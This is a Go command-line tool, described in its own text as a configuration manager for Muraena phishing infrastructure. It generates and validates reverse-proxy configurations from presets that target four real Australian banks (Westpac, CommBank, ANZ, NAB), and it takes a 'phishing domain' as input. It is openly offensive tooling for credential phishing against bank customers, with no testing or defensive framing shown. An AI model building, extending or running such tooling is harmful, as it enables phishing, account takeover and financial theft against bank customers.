package main

import (
	"fmt"
	"os"

	"github.com/muraenateam/muraena/tools/pkg/common"
	"github.com/muraenateam/muraena/tools/pkg/config"
	"github.com/spf13/cobra"
)

var (
	verbose    bool
	logFile    string
	outputPath string
	preset     string
	domain     string
	target     string
)

func main() {
	rootCmd := &cobra.Command{
		Use:   "config-manager",
		Short: "Muraena Configuration Manager",
		Long: `Configuration Manager for Muraena phishing infrastructure.
Generate, validate, and manage Muraena configuration files.`,
	}

	// Generate command
	generateCmd := &cobra.Command{
		Use:   "generate",
		Short: "Generate configuration from preset",
		Long:  "Generate a Muraena configuration file from a target preset",
		RunE:  runGenerate,
	}
	generateCmd.Flags().StringVarP(&preset, "preset", "p", "", "Target preset (westpac, commbank, anz, nab)")
	generateCmd.Flags().StringVarP(&domain, "domain", "d", "", "Phishing domain")
	generateCmd.Flags().StringVarP(&outputPath, "output", "o", "config.toml", "Output file path")
	generateCmd.MarkFlagRequired("preset")
	generateCmd.MarkFlagRequired("domain")

	// Validate command
	validateCmd := &cobra.Command{
		Use:   "validate [config-file]",
		Short: "Validate configuration file",
		Long:  "Validate a Muraena TOML configuration file",
		Args:  cobra.ExactArgs(1),
		RunE:  runValidate,
	}

	// List presets command
	listCmd := &cobra.Command{
		Use:   "list-presets",
		Short: "List available target presets",
		Long:  "List all available target configuration presets",
		RunE:  runListPresets,
	}

	// Set command
	setCmd := &cobra.Command{
		Use:   "set [target] [domain]",
		Short: "Set target configuration",
		Long:  "Configure Muraena for a specific target and domain",
		Args:  cobra.ExactArgs(2),
		RunE:  runSet,
	}

	// Show command
	showCmd := &cobra.Command{
		Use:   "show [config-file]",
		Short: "Show configuration details",
		Long:  "Display the contents of a configuration file",
		Args:  cobra.ExactArgs(1),
		RunE:  runShow,
	}

	// Global flags
	rootCmd.PersistentFlags().BoolVarP(&verbose, "verbose", "v", false, "Enable verbose output")
	rootCmd.PersistentFlags().StringVarP(&logFile, "log", "l", "", "Log file path")

	// Add commands
	rootCmd.AddCommand(generateCmd)
	rootCmd.AddCommand(validateCmd)
	rootCmd.AddCommand(listCmd)
	rootCmd.AddCommand(setCmd)
	rootCmd.AddCommand(showCmd)

	if err := rootCmd.Execute(); err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
}

func runGenerate(cmd *cobra.Command, args []string) error {
	logger, err := common.NewLogger(verbose, logFile)
	if err != nil {
		return fmt.Errorf("failed to create logger: %w", err)
	}
	defer logger.Close()

	logger.Info(fmt.Sprintf("Generating configuration for %s with domain %s", preset, domain))

	generator, err := config.NewGenerator()
	if err != nil {
		return fmt.Errorf("failed to create generator: %w", err)
	}

	configContent, err := generator.GenerateFromPreset(preset, domain)
	if err != nil {
		return fmt.Errorf("failed to generate configuration: %w", err)
	}

	if err := os.WriteFile(outputPath, []byte(configContent), 0644); err != nil {
		return fmt.Errorf("failed to write configuration: %w", err)
	}

	logger.Success(fmt.Sprintf("Configuration generated: %s", outputPath))
	return nil
}

func runValidate(cmd *cobra.Command, args []string) error {
	logger, err := common.NewLogger(verbose, logFile)
	if err != nil {
		return fmt.Errorf("failed to create logger: %w", err)
	}
	defer logger.Close()

	configPath := args[0]
	logger.Info(fmt.Sprintf("Validating configuration: %s", configPath))

	content, err := os.ReadFile(configPath)
	if err != nil {
		return fmt.Errorf("failed to read configuration: %w", err)
	}

	generator, err := config.NewGenerator()
	if err != nil {
		return fmt.Errorf("failed to create generator: %w", err)
	}

	if err := generator.ValidateConfig(string(content)); err != nil {
		logger.Error(fmt.Sprintf("Validation failed: %v", err))
		return err
	}

	logger.Success("Configuration is valid")
	return nil
}

func runListPresets(cmd *cobra.Command, args []string) error {
	logger, err := common.NewLogger(verbose, logFile)
	if err != nil {
		return fmt.Errorf("failed to create logger: %w", err)
	}
	defer logger.Close()

	presets := config.GetAvailablePresets()

	fmt.Println("\n📋 Available Target Presets:")
	fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
	for _, p := range presets {
		fmt.Printf("  • %s - %s\n", p.Name, p.Description)
		fmt.Printf("    Target: %s\n", p.TargetDomain)
	}
	fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

	return nil
}

func runSet(cmd *cobra.Command, args []string) error {
	logger, err := common.NewLogger(verbose, logFile)
	if err != nil {
		return fmt.Errorf("failed to create logger: %w", err)
	}
	defer logger.Close()

	target := args[0]
	domain := args[1]

	logger.Info(fmt.Sprintf("Setting target: %s with domain: %s", target, domain))

	generator, err := config.NewGenerator()
	if err != nil {
		return fmt.Errorf("failed to create generator: %w", err)
	}

	configContent, err := generator.GenerateFromPreset(target, domain)
	if err != nil {
		return fmt.Errorf("failed to generate configuration: %w", err)
	}

	outputPath := "config.toml"
	if err := os.WriteFile(outputPath, []byte(configContent), 0644); err != nil {
		return fmt.Errorf("failed to write configuration: %w", err)
	}

	logger.Success(fmt.Sprintf("Target configured: %s → %s", target, domain))
	logger.Info(fmt.Sprintf("Configuration saved to: %s", outputPath))

	return nil
}

func runShow(cmd *cobra.Command, args []string) error {
	configPath := args[0]

	content, err := os.ReadFile(configPath)
	if err != nil {
		return fmt.Errorf("failed to read configuration: %w", err)
	}

	fmt.Println("\n📄 Configuration File:", configPath)
	fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
	fmt.Println(string(content))
	fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

	return nil
}
